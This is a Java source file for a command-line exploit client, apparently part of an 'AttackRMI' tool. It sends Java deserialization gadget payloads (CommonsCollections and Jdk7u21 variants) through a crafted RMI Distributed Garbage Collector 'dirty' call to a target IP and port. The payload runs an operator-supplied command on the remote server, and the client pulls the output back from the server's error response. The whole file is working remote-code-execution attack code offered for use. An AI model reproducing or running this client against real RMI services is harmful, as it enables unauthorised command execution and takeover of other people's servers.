package exploit;

import payload.Jdk7u21;
import payload.PayloadType;
import sun.rmi.server.MarshalOutputStream;
import sun.rmi.transport.TransportConstants;
import util.Utils;

import javax.net.SocketFactory;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.*;
import java.rmi.Remote;
import java.util.Scanner;

public class JRMPClient {
    private static String cmd;
    public static void main(String[] args) throws Exception {
        if (args.length != 4) {
            System.err.println("Usage: java -cp AttackRMI.jar exploit.JRMPClient [payloadType] [ip] [port] '[command]'");
            System.exit(64);
        }

        final String payloadType = args[0];
        final String remoteIp = args[1];
        final int remotePort = Integer.parseInt(args[2]);
         cmd = args[3];

        final Class<? extends PayloadType> payloadClass = Utils.getPayloadClass(payloadType);

        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.err.println("Available payload types: CommonsCollections2、CommonsCollections11、Jdk7u21");
            System.exit(64);
            return;
        }

        Object object = null;

        if ("Jdk7u21".equals(payloadType)) {
            Jdk7u21.flag = true;
            Jdk7u21 payload = (Jdk7u21) payloadClass.newInstance();
            object = payload.getRebindObject(args[2]);
        } else {
            PayloadType<Remote> payload = payloadClass.newInstance();
            object = payload.getObject(cmd, false);
        }

        try {
            System.err.println(String.format("* Opening JRMP socket %s:%d", remoteIp, remotePort));
            makeDGCCall(remoteIp, remotePort, object);
        } catch (Exception e) {
            e.printStackTrace(System.err);
        }
    }

    public static void makeDGCCall(String hostname, int port, Object payloadObject) throws Exception {
        Socket s = null;
        DataOutputStream dos = null;
        StringBuilder output = null;
        try {
            s = SocketFactory.getDefault().createSocket(hostname, port);
            s.setKeepAlive(true);
            s.setTcpNoDelay(true);

            OutputStream os = s.getOutputStream();
            dos = new DataOutputStream(os);

            dos.writeInt(TransportConstants.Magic);
            dos.writeShort(TransportConstants.Version);
            dos.writeByte(TransportConstants.SingleOpProtocol);

            dos.write(TransportConstants.Call);

            @SuppressWarnings("resource") final ObjectOutputStream objOut = new MarshalOutputStream(dos);

            objOut.writeLong(2); // DGC
            objOut.writeInt(0);
            objOut.writeLong(0);
            objOut.writeShort(0);

            objOut.writeInt(1); // dirty
            objOut.writeLong(-669196253586618813L);

            objOut.writeObject(payloadObject);

            os.flush();
            Scanner in = new Scanner(s.getInputStream(), "UTF-8");
            output = new StringBuilder();
            while (in.hasNextLine()) {
                String line = in.nextLine();
                output.append(line).append("\n");
            }
        } finally {
            if (dos != null) {
                dos.close();
            }
            if (s != null) {
                s.close();
            }
        }
        String stackTrace = output.toString();
        String indexString = "cmdResult: ";
        int index = stackTrace.indexOf(indexString);
        int end = stackTrace.lastIndexOf("cmdEnd");
        if (end > (index + indexString.length())) {
            String exceptionDetails = stackTrace.substring(index + indexString.length(), end);
            System.out.println(exceptionDetails);
        } else if (Jdk7u21.flag) {
            Jdk7u21.getCmdResult(hostname, port, cmd);
        } else {
            System.out.println("未获取到结果");
        }
    }

    static final class MarshalOutputStream extends ObjectOutputStream {


        private URL sendUrl;

        public MarshalOutputStream(OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                String cb = "";

                for (URL u : us) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }


        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}
